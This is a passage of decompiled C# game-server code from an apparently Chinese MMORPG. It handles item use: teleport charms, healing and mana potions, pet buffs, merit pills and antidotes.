							if (array9.Length >= 1)
							{
								for (int m = 0; m < array9.Length; m++)
								{
									if (int.Parse(array9[m]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value12 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value12);
							移动(-440f, 341f, 15f, 2101);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000161:
						附混石头();
						break;
					case 1000000162:
						附混石头();
						break;
					case 1000000163:
						附混石头();
						break;
					case 1000000164:
						附混石头();
						break;
					case 1000000166:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 1)
						{
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 50;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000167:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 1)
						{
							if (GetAddState(1000000167))
							{
								追加状态列表[1000000167].时间结束事件();
							}
							if (GetAddState(1000000168))
							{
								追加状态列表[1000000168].时间结束事件();
							}
							追加状态类 追加状态类65 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类65.FLD_PID, 追加状态类65);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 100;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 100;
							人物灵兽.FLD_物品_追加_MP += 90;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000168:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 1)
						{
							if (GetAddState(1000000167))
							{
								追加状态列表[1000000167].时间结束事件();
							}
							if (GetAddState(1000000168))
							{
								追加状态列表[1000000168].时间结束事件();
							}
							追加状态类 追加状态类61 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类61.FLD_PID, 追加状态类61);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 150;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 200;
							人物灵兽.FLD_物品_追加_MP += 100;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000169:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 2)
						{
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 50;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000170:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 2)
						{
							if (GetAddState(1000000170))
							{
								追加状态列表[1000000170].时间结束事件();
							}
							if (GetAddState(1000000171))
							{
								追加状态列表[1000000171].时间结束事件();
							}
							追加状态类 追加状态类13 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类13.FLD_PID, 追加状态类13);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 100;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 100;
							人物灵兽.FLD_物品_追加_MP += 90;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000171:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 2)
						{
							if (GetAddState(1000000170))
							{
								追加状态列表[1000000170].时间结束事件();
							}
							if (GetAddState(1000000171))
							{
								追加状态列表[1000000171].时间结束事件();
							}
							追加状态类 追加状态类67 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类67.FLD_PID, 追加状态类67);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 150;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 200;
							人物灵兽.FLD_物品_追加_MP += 100;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000172:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 3)
						{
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 50;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000173:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 3)
						{
							if (GetAddState(1000000173))
							{
								追加状态列表[1000000173].时间结束事件();
							}
							if (GetAddState(1000000174))
							{
								追加状态列表[1000000174].时间结束事件();
							}
							追加状态类 追加状态类32 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类32.FLD_PID, 追加状态类32);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 100;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 100;
							人物灵兽.FLD_物品_追加_MP += 90;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000174:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 3)
						{
							if (GetAddState(1000000173))
							{
								追加状态列表[1000000173].时间结束事件();
							}
							if (GetAddState(1000000174))
							{
								追加状态列表[1000000174].时间结束事件();
							}
							追加状态类 追加状态类17 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类17.FLD_PID, 追加状态类17);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 150;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 200;
							人物灵兽.FLD_物品_追加_MP += 100;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000175:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 4)
						{
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 50;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000176:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 4)
						{
							if (GetAddState(1000000176))
							{
								追加状态列表[1000000176].时间结束事件();
							}
							if (GetAddState(1000000177))
							{
								追加状态列表[1000000177].时间结束事件();
							}
							追加状态类 追加状态类70 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类70.FLD_PID, 追加状态类70);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 100;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 100;
							人物灵兽.FLD_物品_追加_MP += 90;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000177:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 4)
						{
							if (GetAddState(1000000176))
							{
								追加状态列表[1000000176].时间结束事件();
							}
							if (GetAddState(1000000177))
							{
								追加状态列表[1000000177].时间结束事件();
							}
							追加状态类 追加状态类58 = new 追加状态类(this, 300000, num5, 0);
							追加状态列表.Add(追加状态类58.FLD_PID, 追加状态类58);
							状态效果人物灵兽(array, 1, 300000);
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 150;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							人物灵兽.FLD_物品_追加_HP += 200;
							人物灵兽.FLD_物品_追加_MP += 100;
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000179:
						if (人物灵兽 != null)
						{
							加血灵兽(70);
							物品使用(num2, num3, 1);
							吃药效果灵兽(num5);
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000180:
						if (人物灵兽 != null)
						{
							加血灵兽(160);
							物品使用(num2, num3, 1);
							吃药效果灵兽(num5);
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000181:
						if (人物灵兽 != null)
						{
							加血灵兽(300);
							物品使用(num2, num3, 1);
							吃药效果灵兽(num5);
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000182:
						if (人物灵兽 != null)
						{
							加魔灵兽(70);
							物品使用(num2, num3, 1);
							吃药效果灵兽(num5);
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000183:
						if (人物灵兽 != null)
						{
							加魔灵兽(160);
							物品使用(num2, num3, 1);
							吃药效果灵兽(num5);
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000184:
						if (人物灵兽 != null)
						{
							加魔灵兽(300);
							物品使用(num2, num3, 1);
							吃药效果灵兽(num5);
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000185:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000833))
						{
							加血(1200);
						}
						else if (追加状态列表.ContainsKey(1000000834))
						{
							加血(900);
						}
						else if (异常状态.ContainsKey(20))
						{
							加血(480);
						}
						else
						{
							加血(600);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000186:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000834))
						{
							加魔(900);
						}
						else if (异常状态.ContainsKey(20))
						{
							加魔(480);
						}
						else
						{
							加魔(600);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000081:
					case 1000000192:
					case 1000000193:
					case 1000000194:
					case 1000000195:
						if (BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0) != 0 && World.Itme.ContainsKey(BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0)))
						{
							if (World.Itme[BitConverter.ToInt32(装备栏已穿装备[14].物品ID, 0)].FLD_RESIDE2 == 15 && 人物灵兽 == null)
							{
								读出灵兽数据(BitConverter.ToInt64(装备栏已穿装备[14].物品全局ID, 0), this);
								if (人物灵兽 != null)
								{
									switch (num5)
									{
									case 1000000192:
										人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
										物品使用(num2, num3, 1);
										break;
									case 1000000193:
										if (人物灵兽.FLD_JOB_LEVEL == 1)
										{
											人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
											物品使用(num2, num3, 1);
										}
										else
										{
											系统提示("此道具只适完成一次转职的灵兽。");
										}
										break;
									case 1000000194:
										if (人物灵兽.FLD_JOB_LEVEL == 2)
										{
											人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
											物品使用(num2, num3, 1);
										}
										else
										{
											系统提示("此道具只适完成二次转职的灵兽。");
										}
										break;
									case 1000000195:
										if (人物灵兽.FLD_JOB_LEVEL == 3)
										{
											人物灵兽.FLD_HP = 人物灵兽.FLD_HP_MAX;
											物品使用(num2, num3, 1);
										}
										else
										{
											系统提示("此道具只适完成三次转职的灵兽。");
										}
										break;
									case 1000000081:
										人物灵兽.FLD_ZCD = 600;
										物品使用(num2, num3, 1);
										break;
									}
									清空灵兽状态();
								}
							}
						}
						else
						{
							系统提示("请先把宠物召唤符装备在道具栏中。");
						}
						break;
					case 1000000199:
						附混石头();
						break;
					case 1000000098:
						if (GetAddState(1000000099))
						{
							追加状态列表[1000000099].时间结束事件();
							物品使用(num2, num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1000000099:
						if (!GetAddState(1000000099))
						{
							追加状态类 追加状态类71 = new 追加状态类(this, 28800000, num5, 1);
							追加状态列表.Add(追加状态类71.FLD_PID, 追加状态类71);
							状态效果(array, 1, 28800000);
							物品使用(num2, num3, 1);
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1000000101:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000833))
						{
							加血(140);
						}
						else if (追加状态列表.ContainsKey(1000000834))
						{
							加血(105);
						}
						else if (异常状态.ContainsKey(20))
						{
							加血(56);
						}
						else
						{
							加血(70);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000102:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000833))
						{
							加血(320);
						}
						else if (追加状态列表.ContainsKey(1000000834))
						{
							加血(240);
						}
						else if (异常状态.ContainsKey(20))
						{
							加血(128);
						}
						else
						{
							加血(160);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000103:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000833))
						{
							加血(600);
						}
						else if (追加状态列表.ContainsKey(1000000834))
						{
							加血(450);
						}
						else if (异常状态.ContainsKey(20))
						{
							加血(240);
						}
						else
						{
							加血(300);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000104:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000834))
						{
							加魔(105);
						}
						else if (异常状态.ContainsKey(20))
						{
							加魔(56);
						}
						else
						{
							加魔(70);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000105:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000834))
						{
							加魔(240);
						}
						else if (异常状态.ContainsKey(20))
						{
							加魔(128);
						}
						else
						{
							加魔(160);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000106:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 50)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000834))
						{
							加魔(450);
						}
						else if (异常状态.ContainsKey(20))
						{
							加魔(240);
						}
						else
						{
							加魔(300);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000110:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array8 = World.地图锁定.Split(';');
							if (array8.Length >= 1)
							{
								for (int l = 0; l < array8.Length; l++)
								{
									if (int.Parse(array8[l]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value8 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value8);
							移动(485f, 2188f, 15f, 101);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000111:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array17 = World.地图锁定.Split(';');
							if (array17.Length >= 1)
							{
								for (int num48 = 0; num48 < array17.Length; num48++)
								{
									if (int.Parse(array17[num48]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value25 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value25);
							移动(-6950f, 16f, 15f, 301);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000112:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array13 = World.地图锁定.Split(';');
							if (array13.Length >= 1)
							{
								for (int num40 = 0; num40 < array13.Length; num40++)
								{
									if (int.Parse(array13[num40]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value19 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value19);
							移动(6824f, 437f, 15f, 201);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000113:
					{
						物品使用(num2, num3, 1);
						int num30 = 0;
						for (int num31 = 0; num31 < 15; num31++)
						{
							if (气功[num31].气功量 != 255)
							{
								num30 += 气功[num31].气功量;
								气功[num31].气功量 = 0;
							}
						}
						if (base.Player_Job_leve >= 6)
						{
							foreach (升天气功类 value30 in 升天气功.Values)
							{
								num30 += value30.气功量;
								value30.气功量 = 0;
							}
						}
						base.Player_Qigong_point += num30;
						更新气功();
						更新武功和状态();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						break;
					}
					case 1000000116:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array11 = World.地图锁定.Split(';');
							if (array11.Length >= 1)
							{
								for (int num26 = 0; num26 < array11.Length; num26++)
								{
									if (int.Parse(array11[num26]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value15 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value15);
							移动(-1360f, -580f, 15f, 1001);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000117:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array10 = World.地图锁定.Split(';');
							if (array10.Length >= 1)
							{
								for (int n = 0; n < array10.Length; n++)
								{
									if (int.Parse(array10[n]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value13 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value13);
							移动(976f, 598f, 15f, 1101);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000122:
						if (base.人物善恶 < 0)
						{
							物品减去属性数量(num3, 1);
							base.人物善恶 += 50000;
							if (base.人物善恶 > 0)
							{
								base.人物善恶 = 0;
							}
							更新武功和状态();
						}
						else
						{
							系统提示("当前善恶值为0，不需要消除。");
						}
						goto IL_a6ab;
					case 1000000415:
					case 1000000416:
						if ((int)DateTime.Now.Subtract(情侣移动time).TotalMilliseconds >= 10000)
						{
							if (解除关系倒计时 != 0)
							{
								情侣提示(53, base.UserName, base.FLD_情侣);
							}
							else
							{
								情侣移动time = DateTime.Now;
								if (base.FLD_情侣.Length != 0)
								{
									Players players13 = World.检查玩家name(base.FLD_情侣);
									if (players13 != null)
									{
										if (players13.人物坐标_地图 != 9001 && players13.人物坐标_地图 != 9101 && players13.人物坐标_地图 != 9201 && players13.人物坐标_地图 != 42101 && players13.人物坐标_地图 != 42101)
										{
											if (players13.人物坐标_地图 == 32002)
											{
												if (活动地图剩余时间 <= 0)
												{
													系统提示("移动失败,活动地图剩余时间为零。");
													break;
												}
												FBtime = DateTime.Now;
												系统提示("开始计时,[" + 活动地图剩余时间 + "]分钟后自动传送到泫勃派。");
											}
											else if (players13.人物坐标_地图 == 30000 || players13.人物坐标_地图 == 30100 || players13.人物坐标_地图 == 30200 || players13.人物坐标_地图 == 30300)
											{
												if (修炼地图剩余时间 <= 0)
												{
													系统提示("移动失败,修炼地图剩余时间为零。");
													break;
												}
												FBtime = DateTime.Now;
												系统提示("开始计时,[" + 修炼地图剩余时间 + "]分钟后自动传送到泫勃派。");
											}
											移动(players13.人物坐标_X, players13.人物坐标_Y, players13.人物坐标_Z, players13.人物坐标_地图);
											人物发光();
											RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
										}
										else
										{
											系统提示("此处不允许使用。");
										}
									}
									else
									{
										系统提示("对方不在线,请稍后在尝试。");
									}
								}
							}
						}
						break;
					case 1000000408:
					{
						if (追加状态列表.ContainsKey(1000000408))
						{
							追加状态列表[1000000408].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1000000408), 1, 90000);
						追加状态类 追加状态类72 = new 追加状态类(this, 90000, 1000000408, 0);
						追加状态列表.Add(追加状态类72.FLD_PID, 追加状态类72);
						addFLD_追加百分比_攻击(0.1);
						更新武功和状态();
						物品使用(num2, num3, 1);
						break;
					}
					case 1000000285:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array16 = World.地图锁定.Split(';');
							if (array16.Length >= 1)
							{
								for (int num45 = 0; num45 < array16.Length; num45++)
								{
									if (int.Parse(array16[num45]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value23 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value23);
							移动(-900f, 145f, 15f, 6001);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000286:
						if (base.Player_WuXun < 0)
						{
							系统提示("你的武勋为负，不能使用");
						}
						else
						{
							物品使用(num2, num3, 1);
							系统提示("使用武勋丹(10000)。");
							base.Player_WuXun += 10000;
							更新武功和状态();
						}
						break;
					case 1000000287:
						if (base.Player_WuXun < 0)
						{
							系统提示("你的武勋为负，不能使用");
						}
						else
						{
							物品使用(num2, num3, 1);
							系统提示("使用武勋丹(20000)。");
							base.Player_WuXun += 20000;
							更新武功和状态();
						}
						break;
					case 1000000288:
						if (base.Player_WuXun < 0)
						{
							系统提示("你的武勋为负，不能使用");
						}
						else
						{
							物品使用(num2, num3, 1);
							系统提示("使用武勋丹(30000)。");
							base.Player_WuXun += 30000;
							更新武功和状态();
						}
						break;
					case 1000000289:
						if (base.Player_WuXun < 0)
						{
							系统提示("你的武勋为负，不能使用");
						}
						else
						{
							物品使用(num2, num3, 1);
							系统提示("使用武勋丹(40000)。");
							base.Player_WuXun += 40000;
							更新武功和状态();
						}
						break;
					case 1000000290:
						if (base.Player_WuXun < 0)
						{
							系统提示("你的武勋为负，不能使用");
						}
						else
						{
							物品使用(num2, num3, 1);
							系统提示("使用武勋丹(50000)。");
							base.Player_WuXun += 50000;
							更新武功和状态();
						}
						break;
					case 1000000291:
						物品使用(num2, num3, 1);
						系统提示("使用武勋丹(70000)。");
						base.Player_WuXun += 50000;
						更新武功和状态();
						break;
					case 1000000293:
						物品使用(num2, num3, 1);
						系统提示("使用武勋丹(80000)。");
						base.Player_WuXun += 50000;
						更新武功和状态();
						break;
					case 1000000294:
						物品使用(num2, num3, 1);
						系统提示("使用武勋丹(90000)。");
						base.Player_WuXun += 50000;
						更新武功和状态();
						break;
					case 1000000295:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000833))
						{
							加血(2000);
						}
						else if (追加状态列表.ContainsKey(1000000834))
						{
							加血(1500);
						}
						else if (异常状态.ContainsKey(20))
						{
							加血(800);
						}
						else
						{
							加血(1000);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000296:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000834))
						{
							加魔(1500);
						}
						else if (异常状态.ContainsKey(20))
						{
							加魔(800);
						}
						else
						{
							加魔(1000);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000297:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000833))
						{
							加血(3400);
						}
						else if (追加状态列表.ContainsKey(1000000834))
						{
							加血(2550);
						}
						else if (异常状态.ContainsKey(20))
						{
							加血(1360);
						}
						else
						{
							加血(1700);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000298:
						if ((int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						if (追加状态列表.ContainsKey(1000000834))
						{
							加魔(2550);
						}
						else if (异常状态.ContainsKey(20))
						{
							加魔(1360);
						}
						else
						{
							加魔(1700);
						}
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000678:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array6 = World.地图锁定.Split(';');
							if (array6.Length >= 1)
							{
								for (int j = 0; j < array6.Length; j++)
								{
									if (int.Parse(array6[j]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value6 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value6);
							移动(0f, 0f, 15f, 26100);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000643:
						if (World.当前是否是银币线路 != 1)
						{
							if (base.Player_Job_leve < 6)
							{
								系统提示("只有升天以后才可以进入。");
							}
							else
							{
								string[] array4 = World.地图锁定.Split(';');
								if (array4.Length >= 1)
								{
									for (int i = 0; i < array4.Length; i++)
									{
										if (int.Parse(array4[i]) == base.人物坐标_地图)
										{
											return;
										}
									}
								}
								坐标Class value2 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
								if (土灵符坐标.ContainsKey(1))
								{
									土灵符坐标.Remove(1);
								}
								土灵符坐标.Add(1, value2);
								移动(-1900f, 2000f, 15f, 25100);
								物品使用(num2, num3, 1);
							}
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000617:
						if (World.当前是否是银币线路 != 1)
						{
							string[] array18 = World.地图锁定.Split(';');
							if (array18.Length >= 1)
							{
								for (int num50 = 0; num50 < array18.Length; num50++)
								{
									if (int.Parse(array18[num50]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							坐标Class value27 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
							if (土灵符坐标.ContainsKey(1))
							{
								土灵符坐标.Remove(1);
							}
							土灵符坐标.Add(1, value27);
							移动(1900f, -820f, 15f, 5001);
							物品使用(num2, num3, 1);
							break;
						}
						系统提示("请到银币广场传送员处移动回泫勃派。", 50, "系统提示");
						goto IL_a6ab;
					case 1000000815:
						if (!异常攻击状态.ContainsKey(13) && !异常攻击状态.ContainsKey(1))
						{
							系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
						}
						else
						{
							结束异常攻击状态列表();
							物品使用(num2, num3, 1);
							更新武功和状态();
						}
						goto IL_a6ab;
					case 1000000816:
						if (异常防御状态.ContainsKey(14))
						{
							结束异常防御状态列表();
							物品减去属性数量(num3, 1);
						}
						else
						{
							系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
						}
						goto IL_a6ab;
					case 1000000820:
						if (异常状态.ContainsKey(20))
						{
							new 异常状态类(this, 1000, 20, 0.0).时间结束玉蜂浆();
							物品减去属性数量(num3, 1);
							更新武功和状态();
						}
						else
						{
							系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
						}
						goto IL_a6ab;
					case 1000000821:
						if (!异常掉蓝状态.ContainsKey(16) && !异常掉蓝状态.ContainsKey(15))
						{
							系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
						}
						else
						{
							结束异常掉蓝状态列表();
							物品减去属性数量(num3, 1);
						}
						goto IL_a6ab;
					case 1000000826:
						if (异常状态.ContainsKey(19))
						{
							new 异常状态类(this, 1000, 19, 0.0).时间结束事活血散();
							物品减去属性数量(num3, 1);
							更新武功和状态();
						}
						else
						{
							系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
						}
						goto IL_a6ab;
					case 1000000830:
					{
						int num41 = 1200000;
						if (追加状态列表.ContainsKey(1000000830))
						{
							break;
						}
						状态效果(BitConverter.GetBytes(1000000830), 1, num41);
						追加状态类 追加状态类57 = new 追加状态类(this, num41, 1000000830, 1);
						追加状态列表.Add(追加状态类57.FLD_PID, 追加状态类57);
						base.人物追加最大_HP += 100;
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					}
					case 1000000831:
					{
